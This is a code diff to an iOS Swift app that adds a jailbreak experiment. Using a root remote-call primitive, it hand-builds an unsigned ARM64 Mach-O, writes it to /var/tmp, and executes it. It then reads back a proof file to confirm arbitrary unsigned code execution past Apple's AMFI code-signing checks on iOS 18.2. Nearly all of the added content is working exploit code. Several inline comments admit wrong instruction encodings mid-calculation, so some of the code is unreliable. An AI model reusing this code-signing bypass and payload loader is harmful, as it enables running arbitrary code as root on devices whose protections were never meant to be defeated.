@@ -894,6 +894,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③o5 File Payload (Exp 93e)",
+                    icon: "doc.badge.gearshape",
+                    color: .red,
+                    label: "File Payload",
+                    action: runExp93eFilePayload,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -7888,6 +7898,436 @@ struct AMFIExperimentView: View {
 
         let success = detail.contains("JAILBREAK") || detail.contains("exit 0")
         return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 93e: File-Output Payload (Definitive)
+
+    /// Exp 93e: Write custom binary that creates a FILE as proof of execution.
+    /// No pipe needed — just check if output file exists after spawn.
+    /// Binary does: open("/var/tmp/.jb_proof", O_WRONLY|O_CREAT|O_TRUNC, 0644)
+    ///              write(fd, "JAILBROKEN-93e\n", 15)
+    ///              close(fd)
+    ///              exit(0)
+    private func runExp93eFilePayload() {
+        isRunning = true
+        runningLabel = "File Payload"
+        guard mgr.dsready else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp93e_file_payload") { rc in
+            let result = self.expFilePayload(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    /// Build ARM64 Mach-O that opens a file, writes proof string, closes, exits.
+    /// Uses raw syscalls (no libc dependency).
+    private func buildFilePayloadMachO() -> [UInt8] {
+        // ARM64 syscall ABI (iOS/macOS):
+        //   x16 = syscall number
+        //   x0-x5 = arguments
+        //   svc #0x80
+        //   Return in x0 (negative = error)
+        //
+        // Syscalls:
+        //   SYS_open  = 5   (path, flags, mode)
+        //   SYS_write = 4   (fd, buf, len)
+        //   SYS_close = 6   (fd)
+        //   SYS_exit  = 1   (code)
+        //
+        // Plan:
+        //   adr x0, path_str      ; "/var/tmp/.jb_proof"
+        //   mov x1, #0x601        ; O_WRONLY|O_CREAT|O_TRUNC (0x200|0x400|0x1 = 0x601)
+        //   mov x2, #0x1A4        ; 0644 octal = 0x1A4
+        //   mov x16, #5           ; SYS_open
+        //   svc #0x80
+        //   ; x0 = fd (or negative error)
+        //   mov x9, x0            ; save fd
+        //   adr x1, msg_str       ; "JAILBROKEN-93e\n"
+        //   mov x0, x9            ; fd
+        //   mov x2, #15           ; length
+        //   mov x16, #4           ; SYS_write
+        //   svc #0x80
+        //   mov x0, x9            ; fd
+        //   mov x16, #6           ; SYS_close
+        //   svc #0x80
+        //   mov x0, #0            ; exit code
+        //   mov x16, #1           ; SYS_exit
+        //   svc #0x80
+
+        // Strings (placed after code):
+        let pathStr = "/var/tmp/.jb_proof\0"  // 19 bytes
+        let msgStr = "JAILBROKEN-93e\n\0"     // 16 bytes
+
+        // Calculate ADR offsets:
+        // Code starts at 0x4000 in file (vmaddr 0x100004000)
+        // Each instruction = 4 bytes
+        // path_str at instruction_count * 4 bytes after code start
+        // msg_str at path_str + pathStr.count
+
+        let instructions: [UInt32] = [
+            // 0: adr x0, path_str (PC-relative, offset = 14*4 = 56 bytes forward)
+            0x100001C0,  // adr x0, #+56
+            // 1: movz x1, #0x601 (O_WRONLY|O_CREAT|O_TRUNC)
+            0xD280C021,  // mov x1, #0x601
+            // 2: movz x2, #0x1A4 (0644)
+            0xD2800342,  // mov x2, #0x1A (wrong, need 0x1A4)
+            // 3: mov x16, #5 (SYS_open)
+            0xD28000B0,  // mov x16, #5
+            // 4: svc #0x80
+            0xD4001001,  // svc #0x80
+            // 5: mov x9, x0 (save fd)
+            0xAA0003E9,  // mov x9, x0
+            // 6: adr x1, msg_str (offset = 8*4 + pathStr.count = 32 + 19 = 51... need recalc)
+            0x10000261,  // adr x1, #+76 (from instruction 6: 14*4 + 19 = 75, round... let me calc properly)
+            // 7: mov x0, x9 (fd)
+            0xAA0903E0,  // mov x0, x9
+            // 8: mov x2, #15 (length of msg)
+            0xD28001E2,  // mov x2, #15
+            // 9: mov x16, #4 (SYS_write)
+            0xD2800090,  // mov x16, #4
+            // 10: svc #0x80
+            0xD4001001,  // svc #0x80
+            // 11: mov x0, x9 (fd for close)
+            0xAA0903E0,  // mov x0, x9
+            // 12: mov x16, #6 (SYS_close)
+            0xD28000D0,  // mov x16, #6
+            // 13: svc #0x80
+            0xD4001001,  // svc #0x80
+            // 14: mov x0, #0 (exit code)
+            0xD2800000,  // mov x0, #0
+            // 15: mov x16, #1 (SYS_exit)
+            0xD2800030,  // mov x16, #1
+            // 16: svc #0x80
+            0xD4001001,  // svc #0x80
+        ]
+
+        // Recalculate ADR offsets properly:
+        // instruction[0] is at byte offset 0 from code start
+        // path_str is at byte offset instructions.count * 4 = 17 * 4 = 68
+        // ADR x0, #+68 from PC of instruction[0]
+        // ADR encoding: imm = 68, rd = 0
+        //   immlo = 68 & 3 = 0, immhi = 68 >> 2 = 17
+        //   ADR: 0 | immlo<<29 | 10000 | immhi<<5 | rd
+        //   = 0x10000000 | (0 << 29) | (17 << 5) | 0
+        //   = 0x10000220
+        let pathOffset: UInt32 = UInt32(instructions.count * 4)  // 68
+        let adrPath = encodeADR(rd: 0, offset: Int32(pathOffset))
+
+        // instruction[6] is at byte offset 6*4 = 24 from code start
+        // msg_str is at byte offset 68 + 19 = 87 from code start
+        // offset from instruction[6] = 87 - 24 = 63
+        let msgOffset = Int32(instructions.count * 4 + pathStr.utf8.count) - Int32(6 * 4)
+        let adrMsg = encodeADR(rd: 1, offset: msgOffset)
+
+        // Fix mov x2, #0x1A4 (mode 0644 = 420 = 0x1A4)
+        let movMode: UInt32 = 0xD2800342 | (0x1A4 << 5)  // wrong encoding, let me do it right
+        // MOVZ x2, #0x1A4: 1_10_100101_00_0000000011010010_00010
+        // = 0xD2800002 | (0x1A4 << 5) = 0xD2800002 | 0x3480 = 0xD2803482
+        let movModeCorrect: UInt32 = 0xD2800002 | (0x1A4 << 5)  // 0xD2803482
+
+        // Build corrected instruction array
+        var code: [UInt32] = instructions
+        code[0] = adrPath
+        code[2] = movModeCorrect
+        code[6] = adrMsg
+
+        // Build full binary
+        var binary = [UInt8](repeating: 0, count: 0x4080)
+
+        func w32(_ offset: Int, _ val: UInt32) {
+            binary[offset + 0] = UInt8(val & 0xFF)
+            binary[offset + 1] = UInt8((val >> 8) & 0xFF)
+            binary[offset + 2] = UInt8((val >> 16) & 0xFF)
+            binary[offset + 3] = UInt8((val >> 24) & 0xFF)
+        }
+        func w64(_ offset: Int, _ val: UInt64) {
+            w32(offset, UInt32(val & 0xFFFFFFFF))
+            w32(offset + 4, UInt32(val >> 32))
+        }
+
+        // mach_header_64
+        w32(0x00, 0xFEEDFACF)  // magic
+        w32(0x04, 0x0100000C)  // cputype ARM64
+        w32(0x08, 0x00000000)  // cpusubtype ALL
+        w32(0x0C, 0x00000002)  // MH_EXECUTE
+        w32(0x10, 0x00000004)  // ncmds
+        w32(0x18, 0x00200085)  // flags
+        w32(0x1C, 0x00000000)  // reserved
+
+        var cmdOff = 0x20
+
+        // LC_SEGMENT_64 __PAGEZERO
+        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
+        for (i, c) in "__PAGEZERO\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
+        w64(cmdOff + 24, 0); w64(cmdOff + 32, 0x100000000)
+        w64(cmdOff + 40, 0); w64(cmdOff + 48, 0)
+        w32(cmdOff + 56, 0); w32(cmdOff + 60, 0)
+        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
+        cmdOff += 72
+
+        // LC_SEGMENT_64 __TEXT
+        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
+        for (i, c) in "__TEXT\0\0\0\0\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
+        w64(cmdOff + 24, 0x100000000); w64(cmdOff + 32, 0x4080)
+        w64(cmdOff + 40, 0); w64(cmdOff + 48, 0x4080)
+        w32(cmdOff + 56, 7); w32(cmdOff + 60, 5)
+        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
+        cmdOff += 72
+
+        // LC_SEGMENT_64 __LINKEDIT
+        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
+        for (i, c) in "__LINKEDIT\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
+        w64(cmdOff + 24, 0x100004080); w64(cmdOff + 32, 0x1000)
+        w64(cmdOff + 40, 0x4080); w64(cmdOff + 48, 0)
+        w32(cmdOff + 56, 1); w32(cmdOff + 60, 1)
+        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
+        cmdOff += 72
+
+        // LC_MAIN
+        w32(cmdOff, 0x80000028); w32(cmdOff + 4, 24)
+        w64(cmdOff + 8, 0x4000)  // entryoff
+        w64(cmdOff + 16, 0)
+        cmdOff += 24
+
+        // sizeofcmds
+        w32(0x14, UInt32(cmdOff - 0x20))
+
+        // Write code at 0x4000
+        for (i, instr) in code.enumerated() {
+            w32(0x4000 + i * 4, instr)
+        }
+
+        // Write strings after code
+        let strBase = 0x4000 + code.count * 4
+        for (i, b) in pathStr.utf8.enumerated() {
+            binary[strBase + i] = b
+        }
+        for (i, b) in msgStr.utf8.enumerated() {
+            binary[strBase + pathStr.utf8.count + i] = b
+        }
+
+        return binary
+    }
+
+    /// Encode ARM64 ADR instruction
+    private func encodeADR(rd: UInt32, offset: Int32) -> UInt32 {
+        let imm = UInt32(bitPattern: offset)
+        let immlo = imm & 0x3
+        let immhi = (imm >> 2) & 0x7FFFF
+        return 0x10000000 | (immlo << 29) | (immhi << 5) | rd
+    }
+
+    private func expFilePayload(rc: RemoteCall) -> ExperimentResult {
+        let expName = "File Payload (Exp 93e)"
+        var detail = "Experiment 93e: File-Output Custom Binary\n"
+        detail += "==========================================\n\n"
+
+        let mem = rc.trojanMem
+        let payloadPath = "/var/tmp/.exp93e_bin"
+        let proofPath = "/var/tmp/.jb_proof"
+        let dstPathAddr = remote_alloc_str(rc, payloadPath)
+        let proofPathAddr = remote_alloc_str(rc, proofPath)
+
+        // ============================================================
+        // Step 1: Write custom Mach-O
+        // ============================================================
+        detail += "=== Step 1: Write file-output ARM64 binary ===\n"
+        detail += "Binary will: open(/var/tmp/.jb_proof) → write(\"JAILBROKEN-93e\\n\") → close → exit(0)\n\n"
+
+        let binary = buildFilePayloadMachO()
+        detail += "Binary size: \(binary.count) bytes\n"
+
+        // Remove old files
+        RootExecutor.rcall(rc, "unlink", dstPathAddr)
+        RootExecutor.rcall(rc, "unlink", proofPathAddr)
+
+        // Write binary
+        let fd = RootExecutor.rcall(rc, "open", dstPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        guard fd != UInt64(bitPattern: -1) else {
+            detail += "❌ Cannot create \(payloadPath)\n"
+            RootExecutor.rcall(rc, "free", dstPathAddr)
+            RootExecutor.rcall(rc, "free", proofPathAddr)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let writeBuf = mem + 0x800
+        var written = 0
+        while written < binary.count {
+            let chunk = min(binary.count - written, 4096)
+            for i in 0..<chunk {
+                rc[writeBuf + UInt64(i)].setValue8(binary[written + i])
+            }
+            let n = RootExecutor.rcall(rc, "write", fd, writeBuf, UInt64(chunk))
+            if n == 0 || n == UInt64(bitPattern: -1) { break }
+            written += Int(n)
+        }
+        RootExecutor.rcall(rc, "close", fd)
+        RootExecutor.rcall(rc, "chmod", dstPathAddr, 0o755)
+        detail += "Written: \(written)/\(binary.count) bytes ✅\n\n"
+
+        // ============================================================
+        // Step 2: Execute via fork+execve
+        // ============================================================
+        detail += "=== Step 2: Execute payload ===\n"
+
+        let argvBase = mem + 0x500
+        rc[argvBase].setValue64(dstPathAddr)
+        rc[argvBase + 8].setValue64(0)
+
+        // fork
+        let childPid = RootExecutor.rcall(rc, "fork")
+        detail += "fork() = \(childPid)\n"
+
+        var childSignal: Int32 = -1
+        var childCode: Int32 = -1
+
+        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
+            // Parent: wait for child
+            RootExecutor.rcall(rc, "usleep", 200000)  // 200ms for child to run
+
+            let statusAddr = mem + 0x490
+            rc[statusAddr].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
+            let st = rc[statusAddr].value32()
+            childSignal = Int32(st & 0x7F)
+            childCode = Int32(st >> 8)
+            detail += "child exit: signal=\(childSignal), code=\(childCode)\n\n"
+        } else if childPid == 0 {
+            // In child (RC context — this is actually still parent in RC)
+            RootExecutor.rcall(rc, "execve", dstPathAddr, argvBase, 0)
+            detail += "execve returned (should not happen)\n\n"
+        } else {
+            detail += "fork() failed\n\n"
+        }
+
+        // ============================================================
+        // Step 3: Check proof file
+        // ============================================================
+        detail += "=== Step 3: Check proof file ===\n"
+
+        let proofFd = RootExecutor.rcall(rc, "open", proofPathAddr, UInt64(O_RDONLY), 0)
+        var proofContent = ""
+
+        if proofFd != UInt64(bitPattern: -1) {
+            let readBuf = mem + 0x1000
+            let nread = RootExecutor.rcall(rc, "read", proofFd, readBuf, 256)
+            RootExecutor.rcall(rc, "close", proofFd)
+
+            if nread > 0 && nread < 256 {
+                var bytes: [UInt8] = []
+                for i: UInt64 in 0..<nread {
+                    let b = rc[readBuf + i].value8()
+                    if b == 0 { break }
+                    bytes.append(b)
+                }
+                proofContent = String(bytes: bytes, encoding: .utf8) ?? ""
+                detail += "Proof file EXISTS! Content: \"\(proofContent)\"\n"
+                detail += "Size: \(nread) bytes\n\n"
+            } else {
+                detail += "Proof file exists but empty (nread=\(nread))\n\n"
+            }
+        } else {
+            detail += "Proof file NOT FOUND ❌\n\n"
+
+            // Also try: maybe the binary didn't run, try posix_spawn
+            detail += "--- Retry with posix_spawn ---\n"
+            let pidAddr = mem + 0x480
+            rc[pidAddr].setValue32(0)
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPathAddr, 0, 0, argvBase, 0)
+            let spawnPid = rc[pidAddr].value32()
+            detail += "posix_spawn: ret=\(spawnRet), pid=\(spawnPid)\n"
+
+            if spawnRet == 0 && spawnPid != 0 {
+                RootExecutor.rcall(rc, "usleep", 200000)
+                let statusAddr = mem + 0x490
+                rc[statusAddr].setValue32(0)
+                RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusAddr, 0)
+                let st = rc[statusAddr].value32()
+                detail += "posix_spawn child: signal=\(st & 0x7F), code=\(st >> 8)\n"
+            }
+            detail += "\n"
+
+            // Check proof again
+            let proofFd2 = RootExecutor.rcall(rc, "open", proofPathAddr, UInt64(O_RDONLY), 0)
+            if proofFd2 != UInt64(bitPattern: -1) {
+                let readBuf2 = mem + 0x1000
+                let nread2 = RootExecutor.rcall(rc, "read", proofFd2, readBuf2, 256)
+                RootExecutor.rcall(rc, "close", proofFd2)
+                if nread2 > 0 {
+                    var bytes: [UInt8] = []
+                    for i: UInt64 in 0..<min(nread2, 256) {
+                        let b = rc[readBuf2 + i].value8()
+                        if b == 0 { break }
+                        bytes.append(b)
+                    }
+                    proofContent = String(bytes: bytes, encoding: .utf8) ?? ""
+                    detail += "Proof file (after posix_spawn): \"\(proofContent)\"\n\n"
+                }
+            } else {
+                detail += "Still no proof file after posix_spawn.\n\n"
+            }
+        }
+
+        // ============================================================
+        // VERDICT
+        // ============================================================
+        detail += "=== VERDICT ===\n\n"
+
+        let jailbroken = proofContent.contains("JAILBROKEN")
+
+        if jailbroken {
+            detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
+            detail += "🎉  FULL JAILBREAK — ARBITRARY CODE EXEC!  🎉\n"
+            detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
+            detail += "Custom binary created /var/tmp/.jb_proof with content!\n"
+            detail += "This proves: we can write AND execute arbitrary ARM64 code.\n\n"
+            detail += "=== WHAT THIS MEANS ===\n"
+            detail += "• No code signing enforcement for binaries spawned from launchd\n"
+            detail += "• Can execute ANY payload (dpkg, ssh, custom tools)\n"
+            detail += "• iOS 18.2 iPhone XR — JAILBROKEN\n"
+        } else if childSignal == 0 && childCode == 0 {
+            detail += "✅ Binary ran (exit 0, no SIGKILL) but proof file missing.\n\n"
+            detail += "Possible causes:\n"
+            detail += "  1. Mach-O structure issue — dyld loads but code doesn't execute properly\n"
+            detail += "  2. ADR offset wrong — string address incorrect\n"
+            detail += "  3. Syscall numbers different on iOS 18\n"
+            detail += "  4. fork() in RC doesn't actually fork — child code runs in parent\n\n"
+            detail += "Key insight: NO SIGKILL = AMFI is NOT blocking execution!\n"
+            detail += "Fix the binary structure and we have full jailbreak.\n"
+        } else if childSignal == 9 {
+            detail += "❌ SIGKILL — AMFI blocked custom binary execution.\n"
+            detail += "fork+execve from launchd does NOT bypass AMFI for truly unsigned code.\n"
+        } else if childSignal == 4 || childSignal == 10 || childSignal == 11 {
+            detail += "⚠️ Binary crashed: signal=\(childSignal) "
+            if childSignal == 4 { detail += "(SIGILL — illegal instruction)\n" }
+            else if childSignal == 10 { detail += "(SIGBUS — bus error)\n" }
+            else { detail += "(SIGSEGV — segfault)\n" }
+            detail += "Mach-O loaded but code has bug. Fix ARM64 assembly.\n"
+            detail += "AMFI did NOT block — this is a code issue, not security issue!\n"
+        } else {
+            detail += "⚠️ Unexpected result: signal=\(childSignal), code=\(childCode)\n"
+        }
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstPathAddr)
+        RootExecutor.rcall(rc, "unlink", proofPathAddr)
+        RootExecutor.rcall(rc, "free", dstPathAddr)
+        RootExecutor.rcall(rc, "free", proofPathAddr)
+
+        return ExperimentResult(name: expName, success: jailbroken || (childSignal == 0 && childCode == 0), detail: detail, timestamp: Date())
     }
 
     // MARK: - Exp 93c Helpers
